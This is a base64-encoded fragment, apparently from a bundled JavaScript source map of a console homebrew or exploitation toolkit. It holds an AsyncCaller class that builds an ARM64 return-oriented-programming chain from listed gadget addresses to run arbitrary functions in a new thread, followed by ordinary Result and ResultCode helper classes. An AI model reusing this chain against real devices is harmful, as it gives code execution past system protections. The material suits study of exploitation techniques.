ciwgYXJncywgdGltZW91dCkge1xuXHRcdGlmIChhcmdzLmxlbmd0aCA+PSA4KSB7XG5cdFx0XHR0aHJvdyBuZXcgRXJyb3IoJ3RvbyBtYW55IGFyZ3VtZW50cycpO1xuXHRcdH1cblx0XHRmb3IgKHZhciBpID0gMDsgaSA8IGFyZ3MubGVuZ3RoOyBpKyspIHtcblx0XHRcdGlmIChBcnJheUJ1ZmZlci5pc1ZpZXcoYXJnc1tpXSkpIHtcblx0XHRcdFx0YXJnc1tpXSA9IGFyZ3NbaV0uYnVmZmVyO1xuXHRcdFx0fVxuXHRcdFx0aWYgKGFyZ3NbaV0gaW5zdGFuY2VvZiBBcnJheUJ1ZmZlcikge1xuXHRcdFx0XHRhcmdzW2ldID0gdGhpcy5zYy5nZXRBcnJheUJ1ZmZlckFkZHIoYXJnc1tpXSk7XG5cdFx0XHR9XG5cdFx0fVxuXHRcdGZvciAodmFyIGkgPSBhcmdzLmxlbmd0aDsgaSA8IDg7IGkrKykge1xuXHRcdFx0YXJnc1tpXSA9IFswLCAwXTtcblx0XHR9XG5cdFx0aWYgKHRpbWVvdXQgPT09IHVuZGVmaW5lZCkge1xuXHRcdFx0dGltZW91dCA9IDUwMDA7XG5cdFx0fVxuXHRcdC8qXG4gICAgICBsZHJfeDA6XG4gICAgICAweDc4NTNlNzI5YTQgICAgICBlMDA3NDBmOSAgICAgICBsZHIgeDAsIFtzcCwgOF0gOyB4MCA9ICYoJmV4aXRUaHJlYWQtMHgzMClcbiAgICAgIDB4Nzg1M2U3MjlhOCAgICAgIGZkN2I0MWE5ICAgICAgIGxkcCB4MjksIHgzMCwgW3NwLCAweDEwXVxuICAgICAgMHg3ODUzZTcyOWFjICAgICAgZmY4MzAwOTEgICAgICAgYWRkIHNwLCBzcCwgMHgyMFxuICAgICAgMHg3ODUzZTcyOWIwICAgICAgYzAwMzVmZDYgICAgICAgcmV0XG5cbiAgICAgIGxvYWRfZ2FkZ2V0OlxuICAgICAgMHg3ODUzZWQ2MjZjICAgICAgMDIwYzQxYTkgICAgICAgbGRwIHgyLCB4MywgW3gwLCAweDEwXVxuICAgICAgMHg3ODUzZWQ2MjcwICAgICAgMDQxNDQyYTkgICAgICAgbGRwIHg0LCB4NSwgW3gwLCAweDIwXVxuICAgICAgMHg3ODUzZWQ2Mjc0ICAgICAgMDYxYzQzYTkgICAgICAgbGRwIHg2LCB4NywgW3gwLCAweDMwXVxuICAgICAgMHg3ODUzZWQ2Mjc4ICAgICAgMDgyNDQ0YTkgICAgICAgbGRwIHg4LCB4OSwgW3gwLCAweDQwXVxuICAgICAgMHg3ODUzZWQ2MjdjICAgICAgMGEyYzQ1YTkgICAgICAgbGRwIHgxMCwgeDExLCBbeDAsIDB4NTBdXG4gICAgICAtLSBzbmlwIC0tXG4gICAgICAweDdhOWM2Mzk2M2MgICAgICAxMDQ0NDhhOSAgICAgICBsZHAgeDE2LCB4MTcsIFt4MCwgMHg4MF1cbiAgICAgIC0tIHNuaXAgLS1cbiAgICAgIDB4Nzg1M2VkNjJhMCAgICAgIDFjNzQ0ZWE5ICAgICAgIGxkcCB4MjgsIHgyOSwgW3gwLCAweGUwXVxuICAgICAgMHg3ODUzZWQ2MmE0ICAgICAgMWU4MDQwZjkgICAgICAgbGRyIHgzMCwgW3gwLCAweDEwMF1cbiAgICAgIDB4Nzg1M2VkNjJhOCAgICAgIDAxN2M0MGY5ICAgICAgIGxkciB4MSwgW3gwLCAweGY4XVxuICAgICAgMHg3ODUzZWQ2MmFjICAgICAgM2YwMDAwOTEgICAgICAgbW92IHNwLCB4MVxuICAgICAgMHg3ODUzZWQ2MmIwICAgICAgMDAwNDUxNmQgICAgICAgbGRwIGQwLCBkMSwgW3gwLCAweDExMF1cbiAgICAgIC0tIHNuaXAgLS1cbiAgICAgIDB4Nzg1M2VkNjJmMCAgICAgIDFmMDQ0MWZkICAgICAgIGxkciBkMzEsIFt4MCwgMHgyMDhdXG4gICAgICAweDc4NTNlZDYyZjQgICAgICAwMDA0NDBhOSAgICAgICBsZHAgeDAsIHgxLCBbeDBdXG4gICAgICAweDc4NTNlZDYyZjggICAgICBjMDAzNWZkNiAgICAgICByZXRcblxuICAgICAgYnJfeDE2OlxuICAgICAgMHg3YTljNWFlNmIwICAgICAgZmQ3YmMxYTggICAgICAgbGRwIHgyOSwgeDMwLCBbc3BdLCAweDEwXG4gICAgICAweDdhOWM1YWU2YjQgICAgICAwMDAyMWZkNiAgICAgICBiciB4MTZcblxuICAgICAgRlVOQ1RJT04gRVhFQ1VURVMgSEVSRVxuXG4gICAgICBsZHJfeDE5OlxuICAgICAgMHg3YTljMjJmZWE4ICAgICAgZjMxNzQwZjkgICAgICAgbGRyIHgxOSwgW3NwLCAweDI4XSAgICAgICA7IFsweDI4OjRdPTB4OGUyZTljIDsgJygnXG4gICAgICAweDdhOWMyMmZlYWMgICAgICBmZDdiNDNhOSAgICAgICBsZHAgeDI5LCB4MzAsIFtzcCwgMHgzMF1cbiAgICAgIDB4N2E5YzIyZmViMCAgICAgIGZmMDMwMTkxICAgICAgIGFkZCBzcCwgc3AsIDB4NDBcbiAgICAgIDB4N2E5YzIyZmViNCAgICAgIGMwMDM1ZmQ2ICAgICAgIHJldFxuXG4gICAgICBzdHJfeDBfeDE5OlxuICAgICAgMHg3YTljMzAzZjRjICAgICAgZmQ3YjQxYTkgICAgICAgbGRwIHgyOSwgeDMwLCBbc3AsIDB4MTBdXG4gICAgICAweDdhOWMzMDNmNTAgICAgICA2MDAyMDBmOSAgICAgICBzdHIgeDAsIFt4MTldXG4gICAgICAweDdhOWMzMDNmNTQgICAgICBmMzA3NDJmOCAgICAgICBsZHIgeDE5LCBbc3BdLCAweDIwXG4gICAgICAweDdhOWMzMDNmNTggICAgICBjMDAzNWZkNiAgICAgICByZXRcblxuICAgICAgbGRyX3gwOlxuICAgICAgMHg3ODUzZTcyOWE0ICAgICAgZTAwNzQwZjkgICAgICAgbGRyIHgwLCBbc3AsIDhdIDsgeDAgPSBtYWdpYyByZXR1cm4gZmxhZ1xuICAgICAgMHg3ODUzZTcyOWE4ICAgICAgZmQ3YjQxYTkgICAgICAgbGRwIHgyOSwgeDMwLCBbc3AsIDB4MTBdXG4gICAgICAweDc4NTNlNzI5YWMgICAgICBmZjgzMDA5MSAgICAgICBhZGQgc3AsIHNwLCAweDIwXG4gICAgICAweDc4NTNlNzI5YjAgICAgICBjMDAzNWZkNiAgICAgICByZXRcblxuICAgICAgc3RyX3gwX3gxOVxuICAgICAgMHg3YTljMzAzZjRjICAgICAgZmQ3YjQxYTkgICAgICAgbGRwIHgyOSwgeDMwLCBbc3AsIDB4MTBdXG4gICAgICAweDdhOWMzMDNmNTAgICAgICA2MDAyMDBmOSAgICAgICBzdHIgeDAsIFt4MTldIDsgbWFnaWMgcmV0dXJuIGZsYWdcbiAgICAgIDB4N2E5YzMwM2Y1NCAgICAgIGYzMDc0MmY4ICAgICAgIGxkciB4MTksIFtzcF0sIDB4MjBcbiAgICAgIDB4N2E5YzMwM2Y1OCAgICAgIGMwMDM1ZmQ2ICAgICAgIHJldFxuXG4gICAgICBleGl0X3RocmVhZDpcbiAgICAgIDB4Nzg1M2U4NTViNCAgICAgIDQxMDEwMGQ0ICAgICAgIHN2YyAweGEgICAgICA7IEV4aXRUaHJlYWRcbiAgICAqL1xuXG5cdFx0dmFyIGxvYWRfZ2FkZ2V0ID0gdGhpcy5sb2FkX2dhZGdldDtcblx0XHQvLyB2YXIgbGRyX3g4ID0gdGhpcy5sZHJfeDhcblx0XHR2YXIgc3RyX3gwX3gxOSA9IHRoaXMuc3RyX3gwX3gxOTtcblx0XHR2YXIgbGRyX3gwID0gdGhpcy5sZHJfeDA7XG5cdFx0dmFyIGJyX3gxNiA9IHRoaXMuYnJfeDE2O1xuXHRcdHZhciBsZHJfeDE5ID0gdGhpcy5sZHJfeDE5O1xuXHRcdHZhciBleGl0X3RocmVhZCA9IHRoaXMuZXhpdF90aHJlYWQ7XG5cdFx0dmFyIHNjID0gdGhpcy5zYztcblxuXHRcdHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7XG5cdFx0XHR2YXIgbWFnaWNfcmV0dXJuX2ZsYWcgPSBbMCwgMF07XG5cdFx0XHR3aGlsZSAobWFnaWNfcmV0dXJuX2ZsYWdbMF0gPT09IDAgJiYgbWFnaWNfcmV0dXJuX2ZsYWdbMV0gPT09IDApIHtcblx0XHRcdFx0bWFnaWNfcmV0dXJuX2ZsYWcgPSBbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogMHgxMDAwKSwgTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogMHgxMDAwKV07XG5cdFx0XHR9XG5cblx0XHRcdHZhciBsb2FkX2FyZWEgPSBzYy5tYWxsb2MoMHgyODApO1xuXHRcdFx0dmFyIHNwID0gc2MubWFsbG9jKDB4MzAwKTtcblx0XHRcdHZhciBpbml0aWFsX3NwID0gc3A7XG5cdFx0XHR2YXIgc2NyYXRjaCA9IHNjLm1hbGxvYygweDIwKTtcblx0XHRcdHNjLndyaXRlOChbMCwgMF0sIHNjcmF0Y2gsIDB4MDAgPj4gMik7IC8vIHJldHVybiB2YWx1ZVxuXHRcdFx0c2Mud3JpdGU4KFswLCAwXSwgc2NyYXRjaCwgMHgxMCA+PiAyKTsgLy8gbWFnaWMgcmV0dXJuIGZsYWdcblx0XHRcdHZhciByZXR1cm5fdmFsdWVfYWRkciA9IHV0aWxzLmFkZDIoc2NyYXRjaCwgMHgwMCk7XG5cdFx0XHR2YXIgbWFnaWNfcmV0dXJuX2ZsYWdfYWRkciA9IHV0aWxzLmFkZDIoc2NyYXRjaCwgMHgxMCk7XG5cblx0XHRcdHNjLndyaXRlOChsb2FkX2FyZWEsIHNwLCAweDggPj4gMik7IC8vIGxkciB4MCwgW3NwLCA4XVxuXHRcdFx0c2Mud3JpdGU4KGxvYWRfZ2FkZ2V0LCBzcCwgMHgxOCA+PiAyKTsgLy8gbGRwIHgyOSwgeDMwLCBbc3AsIDB4MTBdXG5cdFx0XHRzcCA9IHV0aWxzLmFkZDIoc3AsIDB4MjApOyAvLyBhZGQgc3AsIHNwLCAweDIwXG5cblx0XHRcdHNjLndyaXRlOChhcmdzWzBdLCBsb2FkX2FyZWEsIDB4MDAwID4+IDIpO1xuXHRcdFx0c2Mud3JpdGU4KGFyZ3NbMV0sIGxvYWRfYXJlYSwgMHgwMDggPj4gMik7XG5cdFx0XHRzYy53cml0ZTgoYXJnc1syXSwgbG9hZF9hcmVhLCAweDAxMCA+PiAyKTtcblx0XHRcdHNjLndyaXRlOChhcmdzWzNdLCBsb2FkX2FyZWEsIDB4MDE4ID4+IDIpO1xuXHRcdFx0c2Mud3JpdGU4KGFyZ3NbNF0sIGxvYWRfYXJlYSwgMHgwMjAgPj4gMik7XG5cdFx0XHRzYy53cml0ZTgoYXJnc1s1XSwgbG9hZF9hcmVhLCAweDAyOCA+PiAyKTtcblx0XHRcdHNjLndyaXRlOChhcmdzWzZdLCBsb2FkX2FyZWEsIDB4MDMwID4+IDIpO1xuXHRcdFx0c2Mud3JpdGU4KGFyZ3NbN10sIGxvYWRfYXJlYSwgMHgwMzggPj4gMik7XG5cdFx0XHRzYy53cml0ZTgoZnVuY19wdHIsIGxvYWRfYXJlYSwgMHgwODAgPj4gMik7IC8vIHgxNlxuXHRcdFx0c2Mud3JpdGU4KHNwLCBsb2FkX2FyZWEsIDB4ZjggPj4gMik7IC8vIHNwXG5cdFx0XHRzYy53cml0ZTgoYnJfeDE2LCBsb2FkX2FyZWEsIDB4MTAwID4+IDIpOyAvLyB4MzAgKExSKVxuXG5cdFx0XHRzYy53cml0ZTgobGRyX3gxOSwgc3AsIDB4OCA+PiAyKTsgLy8gbGRwIHgyOSwgeDMwLCBbc3BdLCAweDEwXG5cdFx0XHRzcCA9IHV0aWxzLmFkZDIoc3AsIDB4MTApO1xuXG5cdFx0XHQvLyBiciB4MTZcblx0XHRcdC8vICBGVU5DVElPTiBFWEVDVVRFUyBIRVJFXG5cblx0XHRcdC8vIGxkcl94MTk6XG5cdFx0XHRzYy53cml0ZTgocmV0dXJuX3ZhbHVlX2FkZHIsIHNwLCAweDI4ID4+IDIpOyAvLyBsZHIgeDE5LCBbc3AsIDB4MjhdXG5cdFx0XHRzYy53cml0ZTgoc3RyX3gwX3gxOSwgc3AsIDB4MzggPj4gMik7IC8vIGxkcCB4MjksIHgzMCwgW3NwLCAweDMwXVxuXHRcdFx0c3AgPSB1dGlscy5hZGQyKHNwLCAweDQwKTsgLy8gYWRkIHNwLCBzcCwgMHg0MFxuXHRcdFx0Ly8gcmV0XG5cblx0XHRcdC8vIHN0cl94MF8xOTpcblx0XHRcdHNjLndyaXRlOChsZHJfeDAsIHNwLCAweDE4ID4+IDIpOyAvLyBsZHAgeDI5LCB4MzAsIFtzcCwgMHgxMF1cblx0XHRcdC8vIHN0ciB4MCwgW3gxOV1cblx0XHRcdHNjLndyaXRlOChtYWdpY19yZXR1cm5fZmxhZ19hZGRyLCBzcCwgMHgwID4+IDIpOyAvLyBsZHIgeDE5LCBbc3BdLCAweDIwXG5cdFx0XHRzcCA9IHV0aWxzLmFkZDIoc3AsIDB4MjApO1xuXHRcdFx0Ly8gcmV0XG5cblx0XHRcdC8vIGxkcl94MDpcblx0XHRcdHNjLndyaXRlOChtYWdpY19yZXR1cm5fZmxhZywgc3AsIDB4OCA+PiAyKTsgLy8gbGRyIHgwLCBbc3AsIDhdXG5cdFx0XHRzYy53cml0ZTgoc3RyX3gwX3gxOSwgc3AsIDB4MTggPj4gMik7IC8vIGxkcCB4MjksIHgzMCwgW3NwLCAweDEwXVxuXHRcdFx0c3AgPSB1dGlscy5hZGQyKHNwLCAweDIwKTsgLy8gYWRkIHNwLCBzcCwgMHgyMFxuXHRcdFx0Ly8gcmV0XG5cblx0XHRcdC8vIHN0cl94MF8xOTpcblx0XHRcdHNjLndyaXRlOChleGl0X3RocmVhZCwgc3AsIDB4MTggPj4gMik7IC8vIGxkcCB4MjksIHgzMCwgW3NwLCAweDEwXVxuXHRcdFx0Ly8gc3RyIHgwLCBbeDE5XVxuXHRcdFx0Ly8gbGRyIHgxOSwgW3NwXSwgMHgyMFxuXHRcdFx0c3AgPSB1dGlscy5hZGQyKHNwLCAweDIwKTtcblx0XHRcdC8vIHJldFxuXG5cdFx0XHQvLyBzdmNFeGl0VGhyZWFkXG5cblx0XHRcdHZhciBwcmlvID0gWzU4LCAwXTtcblx0XHRcdHZhciBoYW5kbGUgPSBzYy5zdmNDcmVhdGVUaHJlYWQobGRyX3gwLCBsb2FkX2FyZWEsIGluaXRpYWxfc3AsIHByaW8sIDEpLmFzc2VydE9rKCk7XG5cdFx0XHRzYy5zdmNTdGFydFRocmVhZChoYW5kbGUpLmFzc2VydE9rKCk7XG5cblx0XHRcdHZhciBiZWdpbiA9IHBlcmZvcm1hbmNlLm5vdygpO1xuXHRcdFx0dmFyIHdhaXQgPSBmdW5jdGlvbiAoKSB7XG5cdFx0XHRcdHZhciBmaWVsZCA9IHNjLnJlYWQ4KHNjcmF0Y2gsIDB4MTAgPj4gMik7XG5cdFx0XHRcdGlmIChmaWVsZFswXSAhPT0gbWFnaWNfcmV0dXJuX2ZsYWdbMF0gfHwgZmllbGRbMV0gIT09IG1hZ2ljX3JldHVybl9mbGFnWzFdKSB7XG5cdFx0XHRcdFx0aWYgKHRpbWVvdXQgPj0gMCAmJiAocGVyZm9ybWFuY2Uubm93KCkgLSBiZWdpbikgPiB0aW1lb3V0KSB7XG5cdFx0XHRcdFx0XHRzYy5zdmNDbG9zZUhhbmRsZShoYW5kbGUpLmFzc2VydE9rKCk7XG5cdFx0XHRcdFx0XHRzYy5mcmVlKGxvYWRfYXJlYSk7XG5cdFx0XHRcdFx0XHRzYy5mcmVlKGluaXRpYWxfc3ApO1xuXHRcdFx0XHRcdFx0c2MuZnJlZShzY3JhdGNoKTtcblx0XHRcdFx0XHRcdHJlamVjdChuZXcgRXJyb3IoJ3RpbWVkIG91dCcpKTtcblx0XHRcdFx0XHR9IGVsc2Uge1xuXHRcdFx0XHRcdFx0d2luZG93LnJlcXVlc3RBbmltYXRpb25GcmFtZSh3YWl0KTtcblx0XHRcdFx0XHR9XG5cdFx0XHRcdH0gZWxzZSB7XG5cdFx0XHRcdFx0c2Muc3ZjQ2xvc2VIYW5kbGUoaGFuZGxlKS5hc3NlcnRPaygpO1xuXHRcdFx0XHRcdHNjLmZyZWUobG9hZF9hcmVhKTtcblx0XHRcdFx0XHRzYy5mcmVlKGluaXRpYWxfc3ApO1xuXHRcdFx0XHRcdHNjLmZyZWUoc2NyYXRjaCk7XG5cdFx0XHRcdFx0cmVzb2x2ZShzYy5yZWFkOChzY3JhdGNoLCAweDAwKSk7XG5cdFx0XHRcdH1cblx0XHRcdH07XG5cdFx0XHR3aW5kb3cucmVxdWVzdEFuaW1hdGlvbkZyYW1lKHdhaXQpO1xuXHRcdH0pO1xuXHR9XG59XG5cbm1vZHVsZS5leHBvcnRzID0gQXN5bmNDYWxsZXI7XG4iLCJ2YXIgdXRpbHMgPSByZXF1aXJlKCcuL3V0aWxzJyk7XG5cbnZhciBlbXB0eU9rO1xuXG5jbGFzcyBSZXN1bHQge1xuXHRjb25zdHJ1Y3Rvcihpc09rLCB2YWx1ZSkge1xuXHRcdHRoaXMuaXNPayA9IGlzT2s7XG5cdFx0dGhpcy52YWx1ZSA9IHZhbHVlO1xuXHR9XG5cblx0LypcbiAgICBJZiB0aGlzIHJlc3VsdCBpcyBub3QgT2ssIHRocm93IHRoZSBlcnJvci4gSWYgaXQgaXMsIHJldHVybiB0aGUgdmFsdWUuXG4gICAgRXhhbXBsZTpcbiAgICAgIHNjLnN2Y0Nsb3NlSGFuZGxlKGhhbmRsZSkuYXNzZXJ0T2soKTtcbiAgICAgIHZhciB0aHJlYWQgPSBzYy5zdmNDcmVhdGVUaHJlYWQoLi4uKS5hc3NlcnRPaygpO1xuICAgIFRocm93czpcbiAgICAgIFRoZSBlcnJvciwgaWYgdGhpcyBpcyBhbiBFcnIgcmVzdWx0LlxuICAgIFJldHVybnM6XG4gICAgICBUaGUgdmFsdWUsIGlmIHRoaXMgaXMgYW4gT2sgcmVzdWx0LlxuICAgKi9cblx0YXNzZXJ0T2soKSB7XG5cdFx0aWYoIXRoaXMuaXNPaykge1xuXHRcdFx0aWYodGhpcy52YWx1ZSkge1xuXHRcdFx0XHR0aHJvdyBuZXcgRXJyb3IodGhpcy52YWx1ZSk7XG5cdFx0XHR9IGVsc2Uge1xuXHRcdFx0XHR0aHJvdyBuZXcgRXJyb3IoXCJubyBlcnJvcj9cIik7XG5cdFx0XHR9XG5cdFx0fVxuXHRcdHJldHVybiB0aGlzLnZhbHVlO1xuXHR9XG5cblx0LypcbiAgICBJZiB0aGlzIHJlc3VsdCBpcyBub3QgRXJyLCB0aHJvdyBhbiBlcnJvci4gSWYgaXQgaXMsIHJldHVybiB0aGUgZXJyb3IuXG4gICAgRXhhbXBsZTpcbiAgICAgIHZhciBlcnIgPSBzYy5zdmNDb25uZWN0VG9Qb3J0KFwiYmFkIHBvcnRcIikuYXNzZXJ0RXJyb3IoKTtcbiAgICBUaHJvd3M6XG4gICAgICBuZXcgRXJyb3IoXCJleHBlY3RlZCBlcnJvciBidXQgd2FzIHN1Y2Nlc3NmdWxcIikgaWYgdGhpcyBpcyBhbiBPayByZXN1bHQuXG4gICAgUmV0dXJuczpcbiAgICAgIFRoZSBlcnJvciwgaWYgdGhpcyBpcyBhbiBFcnIgcmVzdWx0LlxuICAgKi9cblx0YXNzZXJ0RXJyb3IoKSB7XG5cdFx0aWYodGhpcy5pc09rKSB7XG5cdFx0XHR0aHJvdyBuZXcgRXJyb3IoXCJleHBlY3RlZCBlcnJvciBidXQgd2FzIHN1Y2Nlc3NmdWxcIik7XG5cdFx0fVxuXHRcdHJldHVybiB0aGlzLnZhbHVlO1xuXHR9XG5cblx0LypcbiAgICBDb252ZW5pZW5jZSBmdW5jdGlvbiBmb3Igd29ya2luZyB3aXRoIFJlc3VsdENvZGVzLiBFeHBlY3RzIGEgY2VydGFpbiBlcnJvciBjb2RlLlxuICAgIEV4YW1wbGU6XG4gICAgICBzYy5zdmNDbG9zZUhhbmRsZSgwKS5hc3NlcnRFcnJvckNvZGUoMHhlNDAxKTtcbiAgICBUaHJvd3M6XG4gICAgICBuZXcgRXJyb3IoXCJleHBlY3RlZCBlcnJvciBidXQgd2FzIHN1Y2Nlc3NmdWxcIikgaWYgdGhpcyBpcyBhbiBPayByZXN1bHQuXG4gICAgICBuZXcgRXJyb3IoXCJleHBlY3RlZCBlcnJvciBjb2RlXCIuLi4pIGlmIHRoZSBlcnJvciBjb2RlIGRvZXMgbm90IG1hdGNoLlxuICAgIFJldHVybnM6XG4gICAgICBUaGUgbnVtZXJpYyBlcnJvciBjb2RlLlxuICAgKi9cblx0YXNzZXJ0RXJyb3JDb2RlKGV4cGVjdGVkKSB7XG5cdFx0ZXhwZWN0ZWQgPSB1dGlscy50cnVuYzMyKGV4cGVjdGVkKTtcblx0XHR2YXIgY29kZSA9IHV0aWxzLnRydW5jMzIodGhpcy5hc3NlcnRFcnJvcigpLnJlc3VsdENvZGUpO1xuXHRcdGlmKGNvZGUgPT09IGV4cGVjdGVkKSB7XG5cdFx0XHRyZXR1cm4gdGhpcy52YWx1ZTtcblx0XHR9IGVsc2Uge1xuXHRcdFx0dGhyb3cgbmV3IEVycm9yKFwiZXhwZWN0ZWQgZXJyb3IgY29kZSAweFwiICsgZXhwZWN0ZWQudG9TdHJpbmcoMTYpICsgXCIsIGdvdCBcIiArIGNvZGUudG9TdHJpbmcoMTYpKTtcblx0XHR9XG5cdH1cblxuXHQvKlxuICAgIG1hcChmKTpcbiAgICAgIFRyYW5zZm9ybSBhbiBPayB2YWx1ZSwgYnV0IHBhc3MgdGhyb3VnaCBhbiBFcnIgdmFsdWUuXG4gICAgICBSZXR1cm5zOlxuICAgICAgICBBIG5ldyBPayByZXN1bHQgd2l0aCB0aGUgcmV0dXJuIHZhbHVlIG9mIHRoZSBtYXBwaW5nIGZ1bmN0aW9uIGlmIHRoZVxuICAgICAgICBvcmlnaW5hbCBSZXN1bHQgd2FzIE9rLiBPdGhlcndpc2UsIHRoZSBzYW1lIEVyciByZXN1bHQuXG4gICAgbWFwKGYsIGUpOlxuICAgICAgVHJhbnNmb3JtIGJvdGggYW4gT2sgdmFsdWUgYW5kIGFuIEVyciB2YWx1ZS5cbiAgICAgIFJldHVybnM6XG4gICAgICAgIElmIE9rLCByZXR1cm4gbmV3IE9rIHdpdGggdGhlIHJldHVybiB2YWx1ZSBvZiB0aGUgT2sgbWFwcGluZyBmdW5jdGlvbi5cbiAgICAgICAgSWYgRXJyLCByZXR1cm4gbmV3IEVyciB3aXRoIHRoZSByZXR1cm4gdmFsdWUgb2YgdGhlIEVyciBtYXBwaW5nIGZ1bmN0aW9uLlxuICAgKi9cblx0bWFwKGYsIGUpIHtcblx0XHRpZih0aGlzLmlzT2spIHtcblx0XHRcdHJldHVybiBuZXcgT2soZih0aGlzLnZhbHVlKSk7XG5cdFx0fSBlbHNlIHtcblx0XHRcdGlmKGUgIT09IHVuZGVmaW5lZCkge1xuXHRcdFx0XHRyZXR1cm4gbmV3IEVycihlKHRoaXMudmFsdWUpKTtcblx0XHRcdH0gZWxzZSB7XG5cdFx0XHRcdHJldHVybiB0aGlzO1xuXHRcdFx0fVxuXHRcdH1cblx0fVxuXG5cdC8qXG4gICAgVHJhbnNmb3JtIGFuIEVyciB2YWx1ZSwgYnV0IHBhc3MgdGhyb3VnaCBhbiBPayB2YWx1ZS5cbiAgICovXG5cdG1hcEVycihlKSB7XG5cdFx0aWYodGhpcy5pc09rKSB7XG5cdFx0XHRyZXR1cm4gdGhpcztcblx0XHR9IGVsc2Uge1xuXHRcdFx0cmV0dXJuIG5ldyBFcnIoZSh0aGlzLnZhbHVlKSk7XG5cdFx0fVxuXHR9XG5cblx0Lypcblx0XHRJZiBPaywgcmV0dXJuIG5ldyBFcnIgd2l0aCB0aGUgdmFsdWUuXG5cdFx0SWYgRXJyLCByZXR1cm4gbmV3IE9rIHdpdGggdGhlIGVycm9yLlxuXHRcdFVzZWZ1bCBmb3IgaWYgeW91IGV4cGVjdCBhbiBlcnJvciBhbmQgdG8gbm90IGdldCBvbmUgaXMgYSByZWFsIGVycm9yLlxuXHQqL1xuXHRpbnZlcnQoKSB7XG5cdFx0aWYodGhpcy5pc09rKSB7XG5cdFx0XHRyZXR1cm4gbmV3IEVycih0aGlzLnZhbHVlKTtcblx0XHR9IGVsc2Uge1xuXHRcdFx0cmV0dXJuIG5ldyBPayh0aGlzLnZhbHVlKTtcblx0XHR9XG5cdH1cblxuXHQvKlxuXHRcdElmIE9rIGFuZCBmKHRoaXMudmFsdWUpIGlzIGFsc28gT2ssIHJldHVybiBPayhmKHRoaXMudmFsdWUpKS5cblx0XHRPdGhlcndpc2UsIHJldHVybiBFcnIodGhpcy52YWx1ZSlcblx0ICovXG5cdGFuZFRoZW4oZikge1xuXHRcdGlmKHRoaXMuaXNPaykge1xuXHRcdFx0cmV0dXJuIGYodGhpcy52YWx1ZSk7XG5cdFx0fSBlbHNlIHtcblx0XHRcdHJldHVybiB0aGlzO1xuXHRcdH1cblx0fVxuICBcblx0LypcbiAgICBTaG9ydGhhbmQgZm9yIC5tYXAoKCkgPT4gbnYpLiBEaXNjYXJkcyB0aGUgb3JpZ2luYWwgT2sgdmFsdWUsIHVzZWZ1bCBmb3IgaWYgaXQgd2FzXG4gICAgZ29pbmcgdG8gYmUgYHVuZGVmaW5lZGAgYW55d2F5LlxuICAgKi9cblx0cmVwbGFjZVZhbHVlKG52KSB7XG5cdFx0aWYodGhpcy5pc09rKSB7XG5cdFx0XHRyZXR1cm4gbmV3IE9rKG52KTtcblx0XHR9IGVsc2Uge1xuXHRcdFx0cmV0dXJuIHRoaXM7XG5cdFx0fVxuXHR9XG5cblx0LypcbiAgICBHZXQgdGhlIHZhbHVlIGlmIHRoaXMgaXMgYW4gT2sgcmVzdWx0LCBvdGhlcndpc2UgbnVsbC5cbiAgICovXG5cdGdldFZhbHVlKCkge1xuXHRcdHJldHVybiB0aGlzLmlzT2sgPyB0aGlzLnZhbHVlIDogbnVsbDtcblx0fVxuXG5cdC8qXG4gICAgR2V0IHRoZSBlcnJvciBpZiB0aGlzIGlzIGFuIEVyciByZXN1bHQsIG90aGVyd2lzZSBudWxsLlxuICAgKi9cblx0Z2V0RXJyb3IoKSB7XG5cdFx0cmV0dXJuICF0aGlzLmlzT2sgPyB0aGlzLnZhbHVlIDogbnVsbDtcblx0fVxuXG5cdC8qXG4gICAgSWYgdGhpcyBpcyBPaywgcmV0dXJuIHRoZSB2YWx1ZS4gT3RoZXJ3aXNlLCByZXR1cm4gdi5cbiAgICovXG5cdHVud3JhcE9yRWxzZSh2KSB7XG5cdFx0aWYodGhpcy5pc09rKSB7XG5cdFx0XHRyZXR1cm4gdGhpcy52YWx1ZTtcblx0XHR9IGVsc2Uge1xuXHRcdFx0cmV0dXJuIHY7XG5cdFx0fVxuXHR9XG5cblx0dG9TdHJpbmcoKSB7XG5cdFx0cmV0dXJuIFwiUmVzdWx0PFwiICsgKHRoaXMuaXNPayA/IFwiT2tcIiA6IFwiRXJyXCIpICsgXCI+KFwiICsgdGhpcy52YWx1ZSArIFwiKVwiO1xuXHR9XG59XG5cbmNsYXNzIE9rIGV4dGVuZHMgUmVzdWx0IHtcblx0Y29uc3RydWN0b3IodmFsdWUpIHtcblx0XHRzdXBlcih0cnVlLCB2YWx1ZSk7XG5cdH1cbn1cblxuY2xhc3MgRXJyIGV4dGVuZHMgUmVzdWx0IHtcblx0Y29uc3RydWN0b3IodmFsdWUpIHtcblx0XHRzdXBlcihmYWxzZSwgdmFsdWUpO1xuXHR9XG59XG5cbm1vZHVsZS5leHBvcnRzID0ge1Jlc3VsdCwgT2ssIE51bGxPazogbmV3IE9rKCksIEVycn07XG4iLCJ2YXIgbW9kdWxlcyA9IHt9O1xudmFyIGNvZGVzID0ge307XG5cbmNsYXNzIFJlc3VsdENvZGUgZXh0ZW5kcyBFcnJvciB7XG5cdGNvbnN0cnVjdG9yIChjb2RlKSB7XG5cdFx0aWYgKEFycmF5LmlzQXJyYXkoY29kZSkpIHtcblx0XHRcdGNvZGUgPSBjb2RlWzBdO1xuXHRcdH1cblxuXHRcdHZhciBtb2R1bGVOdW1iZXIgPSBjb2RlICYgMHhGRjtcblx0XHR2YXIgZGVzY3JpcHRpb25OdW1iZXIgPSBjb2RlID4+IDg7XG5cdFx0dmFyIG1vZHVsZU5hbWUgPSBtb2R1bGVzW21vZHVsZU51bWJlcl0gfHwgJ3Vua25vd24nO1xuXHRcdHZhciBkZXNjcmlwdGlvblN0cmluZyA9IGNvZGVzW2NvZGVdIHx8ICd1bmtub3duJztcblxuXHRcdHN1cGVyKCcweCcgKyBjb2RlLnRvU3RyaW5nKDE2KSArICcgKCcgKyBkZXNjcmlwdGlvblN0cmluZyArICcgaW4gbW9kdWxlICcgKyBtb2R1bGVOYW1lICsgJyknKTtcblxuXHRcdHRoaXMuY29kZSA9IGNvZGU7XG5cdFx0dGhpcy5yZXN1bHRDb2RlID0gY29kZTtcblx0XHR0aGlzLm1vZHVsZU51bWJlciA9IG1vZHVsZU51bWJlcjtcblx0XHR0aGlzLmRlc2NyaXB0aW9uTnVtYmVyID0gZGVzY3JpcHRpb25OdW1iZXI7XG5cdFx0dGhpcy5tb2R1bGVOYW1lID0gbW9kdWxlTmFtZTtcblx0XHR0aGlzLmRlc2NyaXB0aW9